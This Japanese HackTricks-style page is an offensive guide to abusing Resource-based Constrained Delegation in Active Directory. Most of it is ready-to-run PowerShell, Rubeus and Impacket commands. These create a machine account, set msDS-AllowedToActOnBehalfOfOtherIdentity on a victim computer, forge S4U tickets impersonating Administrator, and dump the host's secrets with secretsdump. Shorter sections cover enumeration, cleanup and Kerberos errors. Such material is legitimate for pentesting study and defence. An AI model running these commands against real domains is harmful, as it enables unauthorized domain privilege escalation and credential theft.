# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basics of Resource-based Constrained Delegation

これは基本的な [Constrained Delegation](constrained-delegation.md) に似ていますが、**オブジェクトに対して任意のユーザーをマシンに対して**「なりすます」権限を与えるのではなく、Resource-based Constrained Delegation は **どのオブジェクトに対して誰がそのオブジェクトに対して任意のユーザーをなりすませることができるかをオブジェクト側に設定する**仕組みです。

この場合、制約されたオブジェクトは _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ という属性を持ち、その中にそのオブジェクトに対して任意のユーザーをなりすませることができるユーザー名が入ります。

この Constrained Delegation と他の delegation とのもう1つの重要な違いは、**machine account に対する書き込み権限**（_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_）を持つ任意のユーザーが **_msDS-AllowedToActOnBehalfOfOtherIdentity_** を設定できる、という点です（他の形式の Delegation では domain admin 権限が必要でした）。

### New Concepts

従来の Constrained Delegation では、ユーザーの userAccountControl の値内のフラグ **`TrustedToAuthForDelegation`** が S4U2Self を実行するために必要だと説明されていました。しかしそれは完全な事実ではありません。\
実際には、そのフラグがなくても、あなたが **service**（SPN を持っている）であれば任意のユーザーに対して **S4U2Self** を実行できます。ただし、もしあなたが **`TrustedToAuthForDelegation`** を持っている場合、返される TGS は **Forwardable** になり、持っていない場合は返される TGS は **Forwardable ではありません**。

しかし、もし S4U2Proxy で使われる **TGS** が **Forwardable でない**場合、基本的な Constrained Delegation を悪用しようとしても **動作しません**。しかし Resource-Based constrain delegation を悪用する場合は、動作します。

### Attack structure

> If you have **write equivalent privileges** over a **Computer** account you can obtain **privileged access** in that machine.

攻撃者が既に被害者のコンピュータに対して **write equivalent privileges** を持っていると仮定します。

1. 攻撃者は **SPN** を持つアカウントを **侵害する**か、**作成する**（“Service A”）。注意点として、任意の _Admin User_ は追加の特権がなくても最大 10 台まで Computer オブジェクトを作成（_MachineAccountQuota_）し、それらに SPN を設定できます。したがって攻撃者は単に Computer オブジェクトを作成して SPN を設定できます。
2. 攻撃者は被害者のコンピュータ（ServiceB）に対する WRITE 権限を悪用し、resource-based constrained delegation を設定して **ServiceA がその被害者コンピュータ（ServiceB）に対して任意のユーザーをなりすませることを許可** します。
3. 攻撃者は Rubeus を使って **完全な S4U 攻撃**（S4U2Self と S4U2Proxy）を Service A から Service B に対して、Service B に対して特権を持つユーザーに対して行います。
1. S4U2Self（SPN を侵害／作成したアカウントから）：自分に対する **Administrator の TGS** を要求します（Not Forwardable）。
2. S4U2Proxy：前のステップで得た **Not Forwardable の TGS** を使って、**Administrator** から **victim host** への **TGS** を要求します。
3. Not Forwardable の TGS を使っていても、Resource-based constrained delegation を悪用しているため、これが動作します。
4. 攻撃者は **pass-the-ticket** を行い、ユーザーを **impersonate** して **victim ServiceB** へのアクセスを取得できます。

ドメインの _**MachineAccountQuota**_ を確認するには次を使えます:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 攻撃

### コンピュータオブジェクトの作成

ドメイン内にコンピュータオブジェクトを作成するには、**[powermad](https://github.com/Kevin-Robertson/Powermad):** を使用します。
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### リソースベースの制約付き委任の構成

**activedirectory PowerShell module を使用する**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**powerview の使用**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### 完全な S4U attack を実行する (Windows/Rubeus)

まず最初に、新しい Computer オブジェクトをパスワード `123456` で作成したので、そのパスワードのハッシュが必要です:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
これにより、そのアカウントの RC4 と AES hashes が出力されます.\
これで attack を実行できます:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Rubeus の `/altservice` パラメータを使用すると、一度の要求で複数のサービス向けのチケットを生成できます：
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> ユーザーには "**Cannot be delegated**" という属性があることに注意してください。もしユーザーがこの属性を True に設定していると、そのユーザーをなりすますことはできません。このプロパティは bloodhound で確認できます。

### Linux ツール: Impacket を使ったエンドツーエンドの RBCD (2024+)

Linux 上で操作する場合、公式の Impacket ツールを使用して RBCD のフルチェーンを実行できます:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
注記
- LDAP signing/LDAPS が強制されている場合は、`impacket-rbcd -use-ldaps ...` を使用してください。
- AES 鍵を優先してください。多くの最新のドメインでは RC4 が制限されています。Impacket と Rubeus はどちらも AES のみのフローをサポートしています。
- Impacket は一部のツールのために `sname` ("AnySPN") を書き換えることがありますが、可能な限り正しい SPN（例: CIFS/LDAP/HTTP/HOST/MSSQLSvc）を取得してください。

### アクセス

最後のコマンドラインは、Administrator から被害ホストへ **完全な S4U attack を実行し、TGS を注入します**（**メモリ** 上）。\
この例では Administrator から **CIFS** サービスの TGS が要求されたため、**C$** にアクセスできるようになります:
```bash
ls \\victim.domain.local\C$
```
### 異なる service tickets を悪用

詳細は [**available service tickets here**](silver-ticket.md#available-services) を参照してください。

## 列挙、監査、クリーンアップ

### RBCD が設定されたコンピュータを列挙する

PowerShell (SDをデコードしてSIDsを解決):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (read または flush を1コマンドで実行):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### クリーンアップ / RBCD のリセット

- PowerShell (属性をクリア):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos エラー

- **`KDC_ERR_ETYPE_NOTSUPP`**: これは kerberos が DES や RC4 を使用しないように設定されており、あなたが RC4 ハッシュのみを渡していることを意味します。Rubeus に最低でも AES256 ハッシュを渡す（または rc4、aes128、aes256 の各ハッシュを渡す）ようにしてください。例: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: これは現在のコンピュータの時刻が DC の時刻とずれており、kerberos が正しく動作していないことを意味します。
- **`preauth_failed`**: これは与えたユーザー名＋ハッシュの組み合わせでログインできないことを意味します。ハッシュを生成するときにユーザー名に「$」を入れ忘れている可能性があります（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）。
- **`KDC_ERR_BADOPTION`**: これは次のことを意味する場合があります:
  - あなたがなりすまそうとしているユーザーが目的のサービスへアクセスできない（なりすませない、または十分な権限がない）
  - 要求したサービスが存在しない（winrm のチケットを要求したが winrm が動作していない等）
  - 作成した fakecomputer が脆弱なサーバー上での権限を失っており、それらを戻す必要がある
  - 従来型の KCD を悪用している可能性があること。RBCD は非フォワーダブルな S4U2Self チケットで動作するのに対し、KCD はフォワーダブルを要求する点を覚えておいてください。

## 注意、リレーと代替案

- LDAP がフィルタリングされている場合、AD Web Services (ADWS) 経由で RBCD の SD を書き込むこともできます。参照:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos のリレーチェーンは、ローカル SYSTEM を一段で獲得するために RBCD で終わることが多いです。実際のエンドツーエンド例を参照:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- LDAP signing/channel binding が **無効** で、マシンアカウントを作成できる場合、**KrbRelayUp** のようなツールは強制された Kerberos 認証を LDAP にリレーし、ターゲットのコンピュータオブジェクト上でマシンアカウントに対して `msDS-AllowedToActOnBehalfOfOtherIdentity` を設定し、オフホストから S4U 経由で直ちに **Administrator** をインパーソネートできます。

## 参考資料

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py（公式）: https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- 最近の構文を含む Linux クイックチートシート: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
